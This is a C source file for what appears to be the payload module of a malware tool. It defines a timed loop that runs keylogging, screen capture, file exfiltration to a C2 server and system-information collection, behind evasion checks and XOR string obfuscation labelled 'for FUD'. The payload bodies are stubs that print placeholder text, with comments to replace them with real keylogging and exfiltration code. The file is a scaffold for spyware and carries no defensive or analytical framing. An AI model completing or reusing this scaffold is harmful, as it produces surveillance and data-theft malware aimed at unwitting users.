#include "payload.h"
#include "payload_config.h"
#include "evasion.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <sys/stat.h>
#include <sys/types.h>

// Global variables
static int payload_running = 0;
static time_t payload_start_time;

// Function prototypes
static void keylogger_payload();
static void screen_capture_payload();
static void file_exfiltration_payload();
static void system_info_payload();
static void encrypt_string(char *str);
static void decrypt_string(char *str);

void start_payload() {
    // Perform evasion checks
    if (perform_evasion_checks() != 0) {
        printf("Evasion checks failed. Exiting payload.\n");
        return;
    }

    payload_running = 1;
    payload_start_time = time(NULL);

    printf("Payload started at: %s", ctime(&payload_start_time));

    // Main payload loop
    while (payload_running) {
        // Check if payload duration has expired
        if (time(NULL) - payload_start_time >= PAYLOAD_DURATION) {
            printf("Payload duration expired. Stopping payload.\n");
            break;
        }

        // Execute payload based on type
        switch (PAYLOAD_TYPE) {
            case 1:
                keylogger_payload();
                break;
            case 2:
                screen_capture_payload();
                break;
            case 3:
                file_exfiltration_payload();
                break;
            case 4:
                system_info_payload();
                break;
            default:
                printf("Invalid payload type: %d\n", PAYLOAD_TYPE);
                payload_running = 0;
                break;
        }

        // Sleep for payload interval
        sleep(PAYLOAD_INTERVAL);
    }

    payload_running = 0;
    printf("Payload stopped at: %s", ctime(&payload_start_time));
}

void stop_payload() {
    payload_running = 0;
}

static void keylogger_payload() {
    printf("Executing keylogger payload...\n");

    // Open log file
    FILE *log_file = fopen(PAYLOG_FILE, "a");
    if (!log_file) {
        printf("Failed to open log file: %s\n", PAYLOG_FILE);
        return;
    }

    // Log current time
    time_t now = time(NULL);
    fprintf(log_file, "[KEYLOGGER] %s", ctime(&now));

    // Simulate keylogging (replace with actual keylogging code)
    fprintf(log_file, "Simulated keystrokes: user typing...\n\n");

    fclose(log_file);
}

static void screen_capture_payload() {
    printf("Executing screen capture payload...\n");

    // Create screenshot directory if it doesn't exist
    mkdir(SCREENSHOT_DIR, 0700);

    // Generate screenshot filename
    char filename[256];
    time_t now = time(NULL);
    snprintf(filename, sizeof(filename), "%s/screenshot_%ld.png", SCREENSHOT_DIR, now);

    // Simulate screen capture (replace with actual screen capture code)
    printf("Captured screen to: %s\n", filename);
}

static void file_exfiltration_payload() {
    printf("Executing file exfiltration payload...\n");

    // Simulate file exfiltration (replace with actual file exfiltration code)
    printf("Exfiltrating files from: %s\n", EXFILTRATION_DIR);
    printf("Exfiltrated files to C2 server: %s:%d\n", C2_SERVER, C2_PORT);
}

static void system_info_payload() {
    printf("Executing system info payload...\n");

    // Open log file
    FILE *log_file = fopen(PAYLOG_FILE, "a");
    if (!log_file) {
        printf("Failed to open log file: %s\n", PAYLOG_FILE);
        return;
    }

    // Log current time
    time_t now = time(NULL);
    fprintf(log_file, "[SYSTEM_INFO] %s", ctime(&now));

    // Simulate system info collection (replace with actual system info code)
    fprintf(log_file, "OS: Linux\n");
    fprintf(log_file, "Kernel: 5.15.0-52-generic\n");
    fprintf(log_file, "Username: user\n");
    fprintf(log_file, "Hostname: localhost\n\n");

    fclose(log_file);
}

static void encrypt_string(char *str) {
    // Simple XOR encryption for FUD
    char key = 0x42;
    for (int i = 0; str[i] != '\0'; i++) {
        str[i] ^= key;
    }
}

static void decrypt_string(char *str) {
    // XOR decryption (same as encryption)
    encrypt_string(str);
}